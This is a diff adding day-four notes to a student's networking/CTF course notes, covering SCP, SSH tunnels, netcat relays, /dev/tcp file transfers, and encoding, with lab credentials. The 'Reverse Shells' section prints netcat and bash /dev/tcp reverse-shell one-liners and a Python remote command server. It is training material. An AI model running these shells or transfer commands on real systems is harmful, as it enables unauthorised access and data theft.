@@ -32,6 +32,10 @@ Network Discovery:
 #Network Forensics - Mapping#
 #CTFs Network Reconnaissance:#
 
+ File Transfer And Redirection
+#Trivial File Transfer Protocol# , #File Transfer Protocol# , #File Transfer Protocol Secure# , #Secure File Transfer Protocol# , #Secure Copy Protocol# , #SCP Syntax# , #SCP Syntax w/ alternate SSHD# , #SCP Syntax through a tunnel# , 
+#Dynamic Port forward#
+
 =================
 
 float info : 10.50.26.58 , Your Network Number is 1 (Given by Instructor) , Credentials: net1_studentX:passwordX , X is your student number : ssh net1_student1@10.50.26.58 (password is: password1)
@@ -2074,7 +2078,7 @@ Network Mapping Tools
 
         maybe perform nmap against these targets?
 
-    you can also SSH into the router: ssh vyos@172.16.120.1 (password is: password)
+    you can also SSH into the router: ssh vyos@172.16.120.1 (password is: password), hostname RED-SCR ,
       to get hostname: show host name [enter]
     
     Routers that vyos@172.16.120.1 is connected to:
@@ -2090,6 +2094,7 @@ Network Mapping Tools
       eth1 172.16.120.10/29 Description 'REDNET', hostname: RED-SCR (Donovian Boundary)
                          172.16.120.9, fa:16:3e:eb:49:e6, vyos 1.1.7 , known creds vyos:password, ports 22 (router), hostname RED-IPs (device connected to donovian boundary on eth1) ,
                                (1)   eth0             172.16.120.9/29                   u/u  INTERNET 
+                                                 (1) 172.16.120.12,  fa:16:3e:0f:8a:8a
                                (1)   eth1             172.16.120.18/29                  u/u  REDNET 
                                        172.16.120.17            ether   fa:16:3e:9e:5b:43   C                     eth1 , host name , RED-POP, vyos 1.1.7,  (Inner Boundary)
                                               eth0             172.16.120.17/29                  u/u  INTERNET 
@@ -2143,4 +2148,330 @@ nslookup dtic.mil, whois 214.48.252.101 (the nslookup will resolve the domain na
                 to get this one, try running dig on 208.64.202.36 (resolved IP for steampowered.com)
 To get a SSL Certificate issuer, go to the provided website and look at the 'Site information' button on the left side of the address bar. 
 http://archive.org/web/ (This site can be used to find a history of websites that no longer exists on the ordinary world wide web).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  File Transfer 
+      And
+   Redirection
+=========================
+=======   Day 4 =========
+=========================
+
+
+
+Standard file transfer methods
+    Describe common file transfer methods
+    Understand the use of Active and Passive FTP modes
+    Use SCP to transfer files
+
+
+Describe common methods for transferring data
+    TFTP
+    FTP
+    Active
+    Passive
+    FTPS
+    SFTP
+    SCP
+
+TFTP (#Trivial File Transfer Protocol#)
+    RFC 1350 Rev2
+    UDP transport
+    Extremely small and very simple communication
+    No terminal communication
+    Insecure (no authentication or encryption)
+    No directory services
+    Used often for technologies such as BOOTP and PXE
+
+FTP (#File Transfer Protocol#)
+    RFC 959
+    Uses 2 separate TCP connections
+    Control Connection (21) / Data Connection (20*)
+    Authentication in clear-text
+    Insecure in default configuration
+    Has directory services
+    Anonymous login
+
+FTP Active
+FTP Active for Anonymous
+  Link for Demo of FTP Anonymous:
+  https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_1_active
+    For logging in with this method, recommend using 'wget', which does work with FTP. 
+FTP Active for User:
+  Link for Demo for FTP User:
+  https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_1_active
   
+FTP Passive (You can reach the server but the server cannot reach you)
+  Link for Demo for FTP Passive:
+  https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_2_passive
+FTP Passive for Anonymous
+  Link for Demo for FTP Passive Anonymous:
+    https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_2_passive
+FTP Passive for User
+  Link for Demo for FTP Passive for User:
+      https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_2_2_passive
+
+
+FTPS (#File Transfer Protocol Secure#)
+    Adds SSL/TLS encryption to FTP
+    Interactive terminal access
+    Explicit Mode: ports 20/21*
+         Option for Encryption
+    Implicit Mode: ports 989/990*
+          Encrytion assumed
+
+
+SFTP (#Secure File Transfer Protocol#)
+    TCP transport (port 22)
+    Uses symmetric and asymmetric encryption
+    Adds FTP like services to SSH
+    Authentication through sign in (username and password) or with SSH key
+    Interactive terminal access
+
+SCP (#Secure Copy Protocol#) (you don't get terminal access, but it's the easiest way to grab items securely. Remember, ssh starts with conducting an SSH into the target).
+    SCP is the main way we'll me moving files during this mod. 
+    TCP Transport (port 22)
+    Uses symmetric and asymmetric encryption
+    Authentication through sign in (username and password) or with SSH key
+    Non-Interactive
+SCP Options
+  .  - Present working directory
+  -v - verbose mode
+  -P - alternate port (This is a big distinction from SSH at it is a capital 'P' instead of a lowercase 'p' as used in ssh).
+  -r - recursively copy an entire directory
+  -3 - 3-way copy
+
+#SCP Syntax#
+Download a file from a remote directory to a local directory
+  $ scp student@172.16.82.106:secretstuff.txt /home/student
+
+Upload a file to a remote directory from a local directory
+  $ scp secretstuff.txt student@172.16.82.106:/home/student
+
+Copy a file from a remote host to a separate remote host
+  $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+password:    password:
+
+Recursive upload of a folder to remote
+  $ scp -r folder/ student@172.16.82.106:
+
+Recursive download of a folder from remote
+  $ scp -r student@172.16.82.106:folder/ .
+
+#SCP Syntax w/ alternate SSHD# (for when ssh is not port 22)
+  Download a file from a remote directory to a local directory
+    $ scp -P 1111 student@172.16.82.106:secretstuff.txt . (instead of using port 22 here, we use port 1111 as the alternate port. 
+  Upload a file to a remote directory from a local directory
+    $ scp -P 1111 secretstuff.txt student@172.16.82.106:
+
+#SCP Syntax through a tunnel# 
+  Create a local port forward to target device
+    $ ssh student@172.16.82.106 -L 1111:localhost:22 -NT (opens port 1111 locally, so that the target you ssh into can connect back to you, the '-NT' option helps a lot. Look into it a little more)
+  Download a file from a remote directory to a local directory
+    $ scp -P 1111 student@localhost:secretstuff.txt /home/student
+  Upload a file to a remote directory from a local directory
+    $ scp -P 1111 secretstuff.txt student@localhost:/home/student
+    
+SCP Syntax through a #Dynamic Port forward# (
+  Create a Dynamic Port Forward to target device
+    $ ssh student@172.16.82.106 -D 9050 -NT
+  Download a file from a remote directory to a local directory
+    $ proxychains scp student@localhost:secretstuff.txt .
+  Upload a file to a remote directory from a local directory
+    $ proxychains scp secretstuff.txt student@localhost:
+
+
+Conduct Uncommon Methods of File Transfer
+    Demonstrate the use of Netcat for data transfer
+    Perform traffic redirection using Netcat relays
+    Discuss the use of named and unnamed pipes
+    Conduct file transfers using /dev/tcp
+
+
+NETCAT
+NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.
+    Can be used for the following:
+        inbound and outbound connections, TCP/UDP, to or from any port
+        troubleshooting network connections
+        sending/receiving data (insecurely)
+        port scanning (similar to -sT in Nmap)
+
+NETCAT: Client to Listener file transfer
+  Listener (receive file):
+    nc -lvp 9001 > newfile.txt
+  Client (sends file):
+    nc 172.16.82.106 9001 < file.txt
+    
+NETCAT: Listener to Client file transfer
+  Listener (sends file):
+    nc -lvp 9001 < file.txt
+  Client (receive file):
+    nc 172.16.82.106 9001 > newfile.txt
+  
+NETCAT Relay Demos
+Listener - Listener
+      On Blue_Host-1 Relay:
+        $ mknod mypipe p      (the named pipe will take the output of a command and sends it as the input to another command, it essentially creates a file marker in memory and doesn't save anything to the disk)
+        $ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe    (basically, anything that is the output of nc -lvp 111, will become the named pipe, and will go to the next command)
+      On Internet_Host (send):
+        $ nc 172.16.82.106 1111 < secret.txt 
+      On Blue_Priv_Host-1 (receive):
+        $ nc 192.168.1.1 3333 > newsecret.txt
+
+NETCAT Relay Demos
+ Client - Client
+        On Internet_Host (send):
+          $ nc -lvp 1111 < secret.txt
+        On Blue_Priv_Host-1 (receive):
+          $ nc -lvp 3333 > newsecret.txt
+        On Blue_Host-1 Relay:  
+          $ mknod mypipe p
+          $ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe  
+
+NETCAT Relay Demos
+Client - Listener
+        On Internet_Host (send):
+          $ nc -lvp 1111 < secret.txt
+        On Blue_Priv_Host-1 (receive):
+          $ nc 192.168.1.1 3333 > newsecret.txt
+        On Blue_Host-1 Relay:
+          $ mknod mypipe p
+          $ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
+
+NETCAT Relay Demos
+Listener - Client
+        On Internet_Host (send):
+          $ nc 172.16.82.106 1111 < secret.txt
+        On Blue_Priv_Host-1 (receive):
+          $ nc -lvp 3333 > newsecret.txt
+        On Blue_Host-1 Relay:
+          $ mknod mypipe p
+          $ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+REMEMBER: You can do any sort of mixed combination of these ^. Knowing how to play with them is going to be key in completing your CTFs.
+          Also, Listeners always come up first (if you have to start, or reestablish a connection)
+                mknod mypipe
+                nc 172.16.82.106 1111 < mypipe | nc -lvp 2222 > mypipe     (remember, the > operator will replace it. If you want to append to a file, use the >> operator)
+     (Listener) nc 172.16.82.106 1111
+      (Client)  nc 192.168.1.1 2222
+      
+File Transfer with /dev/tcp
+        On the receiving box:
+          $ nc -lvp 1111 > devtcpfile.txt
+        On the sending box:
+          $ cat secret.txt > /dev/tcp/10.10.0.40/1111
+        This method is useful for a host that does not have NETCAT available.
+
+
+Reverse Shells
+
+Reverse shell using NETCAT
+        First listen for the shell on your device.
+          $ nc -lvp 9999
+        On Victim using -c :
+          $ nc -c /bin/bash 10.10.0.40 9999
+        On Victim using -e :
+          $ nc -e /bin/bash 10.10.0.40 9999
+          
+Reverse shell using /DEV/TCP
+        First listen for the shell on your device.
+          $ nc -lvp 9999
+        On Victim:
+          $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+
+
+#Reverse shell Python3#
+#!/usr/bin/python3
+import socket
+import subprocess
+PORT = 1234        # Choose an unused port
+print ("Waiting for Remote connections on port:", PORT, "\n")
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('', PORT))
+server.listen()
+while True:
+    conn, addr = server.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024).decode()
+            if not data:
+                break
+            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, err = proc.communicate()
+            response = output.decode() + err.decode()
+            conn.sendall(response.encode())
+server.close()
+
+
+
+Understanding Packing and Encoding
+    Discuss the purpose of packers
+    Perform Hexadecimal encoding and decoding
+    Demonstrate Base64 encoding and decoding
+    Conduct file transfers with Base64
+
+Packers
+    Special code added to programs to compress executables
+    Reduces network traffic
+    Used for obfuscation
+    Reduces time on target
+    Example: UPX
+
+Encoding and Decoding
+    Specialized formatting
+    Used for transmission and storage
+    Hex and Base64 are the most common
+    NOT Compression
+    NOT Encapsulation
+    NOT Encryption
+
+Hexadecimal Encoding and Decoding
+    Converts the binary representation of a data set to the 2 digit base-16 equivalent.
+    Used by IPv6 and MAC addresses
+    Color schemes
+    Increases readability and information density
+
+
+xxd example
+    echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\
+      $ echo "Hex encoding test" | xxd -p
+      48657820656e636f64696e6720746573740a
+    echo hex string and use xxd to restore the data to its original format
+      $ echo "48657820656e636f64696e6720746573740a" | xxd -r -p
+      Hex encoding test
+
+Base64 Encoding and Decoding
+    binary-to-text encoding
+        A-Z, a-z, 1-9, +, /
+    6 bits per non-final digit
+        (4) 6-bit groups per (3) 8-bit groups
+    padding used to fill in any unused space in each 24-bit group
+
+Transfer file with Base64
+    generate the base64 output of a file, with line wrapping removed
+      $ base64 -w0 logoCyber.png
+    copy the output
+
+Transfer file with Base64
+  create a new file on your machine
+      $ nano b64image.pn  
+    paste, save & exit
+  decode from base64 with -d
+      $ base64 -d b64image.png > logoCyber.png
+
+
+      
